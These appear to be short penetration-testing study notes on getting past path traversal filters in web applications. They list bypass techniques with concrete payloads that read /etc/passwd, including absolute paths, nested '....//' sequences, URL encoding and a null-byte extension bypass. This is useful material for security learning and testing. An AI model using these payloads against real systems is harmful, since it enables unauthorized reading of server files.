--- ---

<h2>Common Obstacles & Bypass</h2>

If the application strips or blocks directory traversal from user-supplied filename:

- Use an absolute path to bypass - filename=/etc/passwd

- Use nested traversal to bypass (`....// or ....\/`)

- Utilize URL Encoding to bypass

- Burp Suite Professional has a predefind payload list - Fuzzing - path traversal
	§ Contains encoded path traversal sequences

- Start with the base file and traverse from there filename=/var/www/images/../../../etc/passwd

- Bypass the requirement to end with a file extension by using a null byte filename=../../../etc/passwd%00.png